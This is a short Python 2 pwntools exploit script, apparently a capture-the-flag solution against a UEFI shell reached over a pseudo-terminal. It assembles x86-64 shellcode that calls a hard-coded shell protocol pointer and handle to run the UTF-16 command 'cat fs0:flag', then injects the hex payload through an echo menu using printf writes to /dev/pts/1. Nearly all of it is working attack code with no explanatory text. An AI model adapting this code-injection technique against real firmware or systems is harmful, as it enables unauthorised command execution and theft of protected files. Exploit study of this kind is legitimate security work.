#!/usr/bin/env python2

import os
import sys
from pwn import *

context.update(arch="amd64", endian="little")

shell_protocol      = 0x028C4360
parent_shell_handle = 0x03218718

def gen_exercise(command, protocol, shell_handle):
    # sc += shellcraft.pushstr(command)

    sc  = '''
    push rsp
    push rbp
    push r9
    push r8
    push rcx
    push rdx

    /* rdx = command string (UTF-16) */
    xor rdx, rdx
    push rdx
    mov rdx, 0x00670061006C0066
    push rdx
    mov rdx, 0x003A003000730066
    push rdx
    mov rdx, 0x0020007400610063
    push rdx
    mov rdx, rsp
    
    /*mov rdx, 0x000000700061006d
    push rdx
    mov rdx, rsp*/

    /* nulls */
    xor r8, r8
    xor r9, r9
    
    /* rcx = pointer to handle */
    mov rcx, {}
    push rcx
    mov rcx, rsp

    /* rax = protocol struct */
    mov rax, {}

    sub rsp, 0x300

    call [rax]

    /* restore stack */

    add rsp, 0x300

    pop rcx
    pop rcx
    pop rcx
    pop rcx

    pop rcx

    pop rdx
    pop rcx
    pop r8
    pop r9
    pop rbp
    pop rsp

    ret
    '''.format(hex(shell_handle), hex(protocol))

    print(sc)
    print(enhex(asm(sc)))

    return enhex(asm(sc))

def send(command):
    os.system("printf \"{}\" > /dev/pts/1".format(command))

def exploit():
    os.system("cat /dev/pts/1 &")

    echo_func = gen_exercise("", shell_protocol, parent_shell_handle)

    sleep(1)
    send("0")
    sleep(1)
    send("Echo\r\n")
    sleep(1)
    send(echo_func + "\r\n")
    sleep(3)
    send("3")


if __name__ == "__main__":
    exploit()